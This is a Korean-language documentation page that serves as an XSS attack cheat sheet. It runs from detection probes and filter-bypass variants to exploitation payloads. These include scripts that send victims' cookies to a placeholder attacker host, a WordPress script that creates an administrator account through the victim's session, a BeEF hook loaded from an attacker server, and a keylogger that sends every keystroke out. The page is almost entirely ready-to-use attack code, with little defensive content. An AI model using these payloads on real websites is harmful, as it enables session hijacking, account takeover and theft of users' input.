---
sidebar_position: 4
title: Cross-Site Scripting (XSS)
---

# Cross-Site Scripting (XSS) 취약점 진단

## Overview

**XSS (Cross-Site Scripting)**: 공격자가 악의적인 스크립트(주로 JavaScript)를 웹 페이지에 삽입하여, 다른 사용자의 브라우저에서 실행되게 하는 클라이언트 사이드 취약점

- **Reflected XSS**: HTTP 요청(파라미터 등)에 포함된 스크립트가 즉시 반사되어 실행
- **Stored XSS**: 게시판, 댓글 등 데이터베이스에 저장된 스크립트가 열람 시 실행 (파급력 높음)
- **DOM-based XSS**: 클라이언트 측 스크립트(DOM)에서 입력값을 처리할 때 발생

---

## 1. Reconnaissance (페이로드 탐지)

### 기본 팝업 및 식별자 테스트
웹 페이지 입력 폼이나 URL 파라미터에 스크립트를 삽입하여 필터링 여부 확인
```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- WAF 우회 및 대소문자 혼용 -->
<sCrIpt>alert(1)</ScRipt>
<script>alert`1`</script>
<script>(alert)(1)</script>
```

### 이벤트 핸들러(Event Handler) 활용
`<script>` 태그가 차단되었을 때 다양한 HTML 태그의 이벤트 속성 이용
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<iframe onload=alert(1)>
```

---

## 2. Exploitation (공격 수행)

### 쿠키(Cookie) 및 세션 탈취
`HttpOnly` 속성이 설정되지 않은 세션 쿠키를 공격자 서버로 전송
```javascript
<!-- Base64 인코딩을 통한 전송 -->
<script>fetch('https://<attacker-ip>/steal?cookie=' + btoa(document.cookie));</script>

<!-- Image 태그를 이용한 GET 요청 전송 -->
<script>new Image().src='http://<attacker-ip>/log.php?c='+document.cookie;</script>

<!-- XMLHttpRequest 객체 사용 -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://<attacker-ip>/steal?cookie=' + document.cookie);
xhr.send();
</script>
```

### XSS Client-Side 공격 및 권한 탈취 (CSRF 연계)
피해자 세션을 이용하여 내부 기능을 강제로 실행 (예: WordPress 관리자 계정 생성)
```javascript
// 관리자 추가 스크립트 예제
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonce = nonceRegex.exec(ajaxRequest.responseText)[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=h@h.com&pass1=Password!&pass2=Password!&role=administrator";
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### BeEF (Browser Exploitation Framework) 연동
피해자 브라우저를 좀비(Hook)로 만들어 지속적인 제어 및 고급 공격 수행
```html
<script src="http://<attacker-ip>:3000/hook.js"></script>
```

---

## 3. Advanced Techniques

### 다양한 우회 (Bypass) 기법
웹 방화벽(WAF)이나 HTML 인코딩을 우회하기 위한 난독화 및 변형 페이로드
```html
<!-- 태그 차단 우회 (내부에 또 다른 태그 삽입) -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>ale<!---->rt(1)</script>

<!-- 괄호() 차단 우회 -->
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>

<!-- HTML 엔티티 및 URL 인코딩 혼합 -->
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Base64 데이터 URI 실행 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

### Keylogger 삽입
사용자의 키보드 입력을 실시간으로 가로채기
```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://<attacker-ip>/log?key=' + String.fromCharCode(e.which));
}
</script>
```
